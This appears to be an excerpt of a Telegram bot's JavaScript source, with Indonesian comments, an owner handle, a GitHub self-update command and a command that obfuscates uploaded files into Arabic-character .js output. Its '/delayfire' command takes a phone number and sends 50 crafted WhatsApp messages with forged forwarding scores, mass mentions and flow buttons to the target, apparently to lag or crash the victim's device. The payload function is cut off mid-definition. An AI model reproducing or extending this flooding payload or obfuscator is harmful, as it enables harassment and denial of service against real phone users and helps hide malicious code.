...
// ================== LOAD CONFIG FROM update.json ==================
function loadUpdateConfig() {
  try {
    // Ambil config dari update.js (CommonJS)
    const cfg = require("./update.js");
...
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "update_index.js";
...
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.json (Contents: Read and write).");
  }
}
...
bot.command("update", async (ctx) => {
  try {
    ...
    try {
      const backup = path.join(process.cwd(), `index.backup_${Date.now()}.js`);
...
// /encrypt & /decrypt -> REPLY KE FILE (DOCUMENT)
// INPUT: FILE APA AJA
// OUTPUT: FILE .js (WAJIB)
// ==================================================

/* ===== ARAB STYLE ENCRYPT (REVERSIBLE) ===== */
...
const ARAB = [
  ...
  "ء","آ","أ","إ","ؤ","ئ","ة","ى","ـ",
  "ﺍ","ﺑ","ﺗ","ﺛ","ﺟ","ﺣ","ﺧ","ﺩ","ﺫ","ﺭ","ﺯ","ﺳ","ﺷ","ﺻ","ﺿ","ﻁ","ﻅ","ﻋ","ﻏ","ﻑ","ﻗ","ﻛ","ﻟ","ﻣ","ﻧ","ﻫ","ﻭ","ﻳ",
  "۝"
];
...
function encryptBuffer(buffer) {
  ...
  let out = MARK;
  for (const c of b64) out += enc[c] || c;
  return out;
}

function decryptToBuffer(text) {
  if (!text.startsWith(MARK)) throw "INVALID";
  let b64 = "";
  for (const c of text.slice(1)) b64 += dec[c] || c;
  return Buffer.from(b64, "base64");
}

/* ===== FILE HANDLER ===== */

async function getRepliedFile(ctx) {
...
async function replyFile(ctx, filename, content) {
  const data =
`// generated by encrypt bot
...
bot.command("arab", async (ctx) => {
  try {
    const fileBuf = await getRepliedFile(ctx);
    if (!fileBuf) return ctx.reply("REPLY FILE");

    const encrypted = encryptBuffer(fileBuf);
    await replyFile(ctx, "encrypted_file.js", encrypted);
  } catch {
    ctx.reply("ERROR ENCRYPT");
  }
});
...
bot.command("decrypt", async (ctx) => {
  try {
    ...
    const decryptedBuf = decryptToBuffer(text);
...
bot.start((ctx) => {
  ...
  const menuMessage = `
<blockquote><pre>
アリグとかゴジャイマーゼ グシオン リクス ナンバー1 Lolyx
⌬ OWNER : @Lixxishere2 ezzet 
...
bot.command("delayfire", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayfire 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
╘═——————————————═⬡
  ...
  for (let i = 0; i < 50; i++) {
    await delaayylangu(sock, target)
    await sleep(1000);
  }
...
async function delaayylangu(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      ...
      mediaKeyTimestamp: "1743",
        ...
        mentionedJid: Array.from(
          ...
          forwardingScore: 999,
          isForwarded: true,
          conversionSource: "call_permission_request"            
    },
      nativeFlowMessage: {
          buttons: [
            {
